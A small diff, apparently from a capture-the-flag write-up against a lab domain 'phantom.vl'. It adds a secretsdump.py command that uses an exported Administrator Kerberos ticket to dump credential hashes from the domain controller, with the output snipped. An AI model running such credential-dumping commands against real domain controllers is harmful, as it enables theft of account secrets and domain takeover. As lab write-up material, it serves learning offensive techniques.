@@ -747,6 +747,10 @@ export KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache
 Then ill export the ticket
 
 ```python
+secretsdump.py -k -no-pass dc.phantom.vl
+
+...[SNIP]...
+
 
 ```
 
